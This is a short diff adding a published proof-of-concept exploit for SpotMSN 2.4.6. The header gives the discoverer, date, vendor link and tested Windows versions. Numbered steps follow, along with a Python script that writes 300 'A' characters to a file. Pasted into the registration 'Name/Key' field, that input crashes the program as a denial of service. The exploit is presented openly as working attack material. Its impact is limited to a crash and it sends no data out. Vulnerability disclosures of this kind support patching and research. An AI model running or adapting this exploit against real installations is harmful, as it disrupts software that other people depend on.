@@ -1,0 +1,22 @@
+#Exploit Title: SpotMSN 2.4.6 - 'Name/Key' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-12
+#Vendor Homepage: www.nsauditor.com 
+#Software Link: http://www.nsauditor.com/downloads/spotmsn_setup.exe
+#Tested Version: 2.4.6
+#Tested on: Windows Windows 10 Single Language x64 / 7 x64 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: SpotMSN_2.4.6.py
+#2.- Open SpotMSN.txt and copy content to clipboard
+#3.- Open SpotMSN
+#4.- Select "Register" > "Enter Registration Code..."
+#5.- In "Name/Key" paste Clipboard
+#6.- Click "Ok"
+#7.- Crarshed
+ 
+cod = "\x41" * 300
+ 
+f = open('SpotMSN.txt', 'w')
+f.write(cod)
+f.close()
